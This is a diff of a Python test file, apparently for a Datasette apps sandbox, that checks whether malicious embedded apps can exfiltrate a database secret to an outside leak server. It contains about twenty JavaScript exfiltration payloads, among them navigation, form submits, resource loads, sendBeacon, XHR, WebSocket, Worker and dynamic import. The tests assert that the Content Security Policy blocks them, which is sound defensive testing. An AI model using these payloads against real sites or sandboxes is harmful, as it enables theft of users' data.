@@ -13,7 +13,6 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 from urllib.request import urlopen
 
-import pytest
 from datasette.app import Datasette
 from playwright.sync_api import sync_playwright
 
@@ -136,7 +135,7 @@ class LeakServer:
 
         class Handler(BaseHTTPRequestHandler):
             def _record_and_respond(self):
-                if self.path.startswith("/leak?"):
+                if self.path.startswith("/leak"):
                     with leak_server._lock:
                         leak_server.requests.append(
                             {"method": self.command, "path": self.path}
@@ -166,13 +165,22 @@ class LeakServer:
         self._server.server_close()
         self._thread.join(timeout=5)
 
+    def wait_for_request_count(self, count, timeout=5):
+        deadline = time.monotonic() + timeout
+        while time.monotonic() < deadline:
+            with self._lock:
+                if len(self.requests) >= count:
+                    return
+            time.sleep(0.05)
+        raise AssertionError(f"Expected {count} leak requests, got {self.requests}")
+
 
 @contextmanager
-def _browser_page():
+def _browser_page(*, args=None, ignore_https_errors=False):
     with sync_playwright() as playwright:
-        browser = playwright.chromium.launch()
+        browser = playwright.chromium.launch(args=args or [])
         try:
-            page = browser.new_page()
+            page = browser.new_page(ignore_https_errors=ignore_https_errors)
             yield page
         finally:
             browser.close()
@@ -203,106 +211,242 @@ def _create_content_database(path):
 
 
 MALICIOUS_EXFILTRATION_ATTEMPTS = [
-    pytest.param(
+    (
+        "self-navigation",
         "window.location.href = LEAK_URL;",
-        id="window-location-href",
     ),
-    pytest.param(
-        "window.location.assign(LEAK_URL);",
-        id="window-location-assign",
+    (
+        "top-navigation",
+        "window.top.location.href = LEAK_URL;",
     ),
-    pytest.param(
-        "window.location.replace(LEAK_URL);",
-        id="window-location-replace",
+    (
+        "popup-navigation",
+        'window.open(LEAK_URL, "_blank");',
     ),
-    pytest.param(
+    (
+        "anchor-top-click",
+        """
+const anchor = document.createElement("a");
+anchor.href = LEAK_URL;
+anchor.target = "_top";
+document.body.appendChild(anchor);
+anchor.click();
+""",
+    ),
+    (
+        "anchor-ping",
+        """
+const anchor = document.createElement("a");
+anchor.href = "#";
+anchor.ping = LEAK_URL;
+document.body.appendChild(anchor);
+anchor.click();
+""",
+    ),
+    (
+        "meta-refresh",
+        """
+const meta = document.createElement("meta");
+meta.httpEquiv = "refresh";
+meta.content = "0; url=" + LEAK_URL;
+document.head.appendChild(meta);
+""",
+    ),
+    (
+        "form-get",
         """
 const form = document.createElement("form");
 form.method = "GET";
 form.action = LEAK_BASE + "/leak";
 const input = document.createElement("input");
 input.name = "secret";
-input.value = "top-secret";
+input.value = SECRET;
 form.appendChild(input);
 document.body.appendChild(form);
 form.submit();
 """,
-        id="get-form-submit",
     ),
-    pytest.param(
+    (
+        "form-get-top",
         """
 const form = document.createElement("form");
-form.method = "POST";
-form.action = LEAK_BASE + "/leak?secret=top-secret";
+form.method = "GET";
+form.action = LEAK_BASE + "/leak";
+form.target = "_top";
+const input = document.createElement("input");
+input.name = "secret";
+input.value = SECRET;
+form.appendChild(input);
 document.body.appendChild(form);
 form.submit();
 """,
-        id="post-form-submit",
     ),
-    pytest.param(
+    (
+        "image-src",
         """
 const img = document.createElement("img");
 img.src = LEAK_URL;
 document.body.appendChild(img);
 """,
-        id="image-src",
     ),
-    pytest.param(
+    (
+        "script-src",
         """
 const script = document.createElement("script");
 script.src = LEAK_URL;
 document.body.appendChild(script);
 """,
-        id="script-src",
     ),
-    pytest.param(
+    (
+        "stylesheet-href",
         """
 const link = document.createElement("link");
 link.rel = "stylesheet";
 link.href = LEAK_URL;
 document.head.appendChild(link);
 """,
-        id="stylesheet-href",
     ),
-    pytest.param(
+    (
+        "nested-iframe-src",
+        """
+const iframe = document.createElement("iframe");
+iframe.src = LEAK_URL;
+document.body.appendChild(iframe);
+""",
+    ),
+    (
+        "object-data",
+        """
+const object = document.createElement("object");
+object.data = LEAK_URL;
+document.body.appendChild(object);
+""",
+    ),
+    (
+        "audio-src",
+        """
+const audio = document.createElement("audio");
+audio.src = LEAK_URL;
+document.body.appendChild(audio);
+audio.load();
+""",
+    ),
+    (
+        "prefetch-link",
+        """
+const link = document.createElement("link");
+link.rel = "prefetch";
+link.href = LEAK_URL;
+document.head.appendChild(link);
+""",
+    ),
+    (
+        "css-import",
+        """
+const style = document.createElement("style");
+style.textContent = "@import url(" + JSON.stringify(LEAK_URL) + ");";
+document.head.appendChild(style);
+""",
+    ),
+    (
+        "svg-image-href",
+        """
+const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+const image = document.createElementNS("http://www.w3.org/2000/svg", "image");
+image.setAttribute("href", LEAK_URL);
+svg.appendChild(image);
+document.body.appendChild(svg);
+""",
+    ),
+    (
+        "fetch-no-cors",
         'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
-        id="fetch-no-cors",
     ),
-    pytest.param(
-        'navigator.sendBeacon(LEAK_URL, "top-secret");',
-        id="send-beacon",
+    (
+        "send-beacon",
+        "navigator.sendBeacon(LEAK_URL, SECRET);",
     ),
-    pytest.param(
+    (
+        "xml-http-request-post",
         """
 const xhr = new XMLHttpRequest();
-xhr.open("GET", LEAK_URL);
-xhr.send();
+xhr.open("POST", LEAK_URL);
+xhr.send(SECRET);
 """,
-        id="xml-http-request",
+    ),
+    (
+        "websocket",
+        """
+const socket = new WebSocket(WS_LEAK_URL);
+socket.onerror = function() { socket.close(); };
+""",
+    ),
+    (
+        "worker-script",
+        """
+try {
+  const worker = new Worker(LEAK_URL);
+  worker.terminate();
+} catch (error) {}
+""",
+    ),
+    (
+        "dynamic-import",
+        """
+import(LEAK_URL).catch(function() {});
+""",
     ),
 ]
 
 
-def _malicious_app_html(attempt_script, leak_url, leak_base):
+def _create_secret_database(path):
+    conn = sqlite3.connect(path)
+    try:
+        conn.execute("create table secrets (secret text)")
+        conn.execute("insert into secrets values ('database-secret')")
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def _malicious_app_html(attempt_script, leak_base):
     return f"""<!doctype html>
 <html>
 <head><title>Exfiltration attempt</title></head>
 <body>
 <p id="status">loaded</p>
 <script>
-const LEAK_URL = {json.dumps(leak_url)};
 const LEAK_BASE = {json.dumps(leak_base)};
-document.getElementById("status").textContent = "attempted";
-setTimeout(function() {{
-  try {{
+const status = document.getElementById("status");
+(async function() {{
+  const result = await datasette.query("content", "select secret from secrets");
+  const SECRET = result.rows[0].secret;
+  const LEAK_URL = LEAK_BASE + "/leak?secret=" + encodeURIComponent(SECRET);
+  const WS_LEAK_URL = LEAK_URL.replace(/^http/, "ws");
+  status.textContent = "attempted";
+  setTimeout(function() {{
+    try {{
 {attempt_script}
-  }} catch (error) {{
-    document.getElementById("status").textContent = "attempted with error";
-  }}
-}}, 100);
+    }} catch (error) {{
+      status.textContent = "attempted with error";
+    }}
+  }}, 100);
+}})();
 </script>
 </body>
 </html>"""
+
+
+async def _create_malicious_apps(server, leak_base):
+    apps = []
+    for name, attempt_script in MALICIOUS_EXFILTRATION_ATTEMPTS:
+        app = await server.create_app(
+            _malicious_app_html(attempt_script, leak_base),
+            name=f"Exfiltration attempt: {name}",
+            sql_databases=["content"],
+        )
+        apps.append((name, app))
+    return apps
 
 
 def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
@@ -370,27 +514,56 @@ console.error("Playwright saw this app error");
         )
 
 
-@pytest.mark.parametrize("attempt_script", MALICIOUS_EXFILTRATION_ATTEMPTS)
-def test_malicious_apps_cannot_exfiltrate_to_external_origin(
-    tmp_path, attempt_script
-):
+def test_malicious_apps_cannot_exfiltrate_to_external_origin(tmp_path):
+    content_db_path = tmp_path / "content.db"
+    _create_secret_database(content_db_path)
     with LeakServer() as leak_server:
-        server = DatasetteServer(tmp_path)
-        leak_url = leak_server.url + "/leak?secret=top-secret"
+        server = DatasetteServer(tmp_path, files=[content_db_path])
+        apps = asyncio.run(_create_malicious_apps(server, leak_server.url))
+
+        with server, _browser_page() as page:
+            for name, app in apps:
+                response = page.goto(server.app_url(app))
+                assert response is not None, name
+                assert (
+                    response.headers["content-security-policy"] == "frame-src 'none';"
+                ), name
+                iframe = _iframe(page)
+                iframe.locator("#status").wait_for()
+                assert iframe.locator("#status").inner_text() == "attempted", name
+                page.wait_for_timeout(300)
+                assert leak_server.requests == [], name
+                for open_page in page.context.pages:
+                    if open_page != page:
+                        open_page.close()
+
+
+def test_csp_allowlisted_origin_can_receive_exfiltrated_data(tmp_path, monkeypatch):
+    content_db_path = tmp_path / "content.db"
+    _create_secret_database(content_db_path)
+    monkeypatch.setenv("DATASETTE_APPS_ALLOW_INSECURE_TEST_CSP_ORIGINS", "1")
+    with LeakServer() as leak_server:
+        server = DatasetteServer(tmp_path, files=[content_db_path])
         app = asyncio.run(
             server.create_app(
-                _malicious_app_html(attempt_script, leak_url, leak_server.url),
-                name="Exfiltration attempt",
+                _malicious_app_html(
+                    'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
+                    leak_server.url,
+                ),
+                name="Allowed exfiltration attempt",
+                sql_databases=["content"],
+                csp_origins=[leak_server.url],
             )
         )
 
         with server, _browser_page() as page:
             response = page.goto(server.app_url(app))
             assert response is not None
-            assert response.headers["content-security-policy"] == "frame-src 'none';"
             iframe = _iframe(page)
             iframe.locator("#status").wait_for()
             assert iframe.locator("#status").inner_text() == "attempted"
-            page.wait_for_timeout(500)
+            leak_server.wait_for_request_count(1)
 
-        assert leak_server.requests == []
+        assert leak_server.requests == [
+            {"method": "GET", "path": "/leak?secret=database-secret"}
+        ]
